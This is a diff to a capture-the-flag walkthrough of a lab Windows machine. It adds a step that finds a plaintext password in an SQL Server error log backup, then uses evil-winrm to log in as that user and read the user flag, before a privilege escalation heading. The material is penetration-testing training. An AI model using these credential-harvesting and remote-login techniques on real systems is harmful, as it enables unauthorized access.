@@ -452,9 +452,9 @@ sequel\sql_svc
 
 <br />
 
-The `sql_svc` directory is empty.
+The `sql_svc` user's directory is empty.
 
-However, there is one more user profile on the system: `Ryan.Cooper`
+However, there is another user profile on the system: `Ryan.Cooper`
 
 <br />
 
@@ -479,7 +479,7 @@ d-----         2/7/2023   8:10 AM                sql_svc
 
 <br />
 
-While enumerating the system, we found an unusual directory on `C:\`, called `SQLServer`:
+While enumerating the system, we found an unusual directory on `C:\`, named `SQLServer`:
 
 <br />
 
@@ -503,7 +503,7 @@ d-----         2/6/2023   7:21 AM                Windows
 
 <br />
 
-Inside it, there are some files and another folder named `Logs`:
+Inside it, there are some files and a subdirectory named `Logs`:
 
 <br />
 
@@ -524,7 +524,7 @@ d-----       11/18/2022   1:37 PM                SQLEXPR_2019
 
 <br />
 
-Inside that folder, we find an error log file: `ERRORLOG.BAK`
+Within that folder, we found an error log file: `ERRORLOG.BAK`
 
 <br />
 
@@ -539,5 +539,42 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
 ```
+
+<br />
+
+Upon inspecting the contents of this file, we found potential credentials: `Ryan.Cooper:NuclearMosquito3`
+
+<br />
+
+```bash
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
+2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
+```
+
+Using these credentials, we can pivot to the `Ryan.Cooper` account and retrieve the `user.txt` flag:
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
+d94615721bdc257a6576b20fbbxxxxxx
+```
+
+<br />
+
+# Privilege Escalation: Ryan.Cooper -> NT AUTHORITY\SYSTEM
 
 <br />
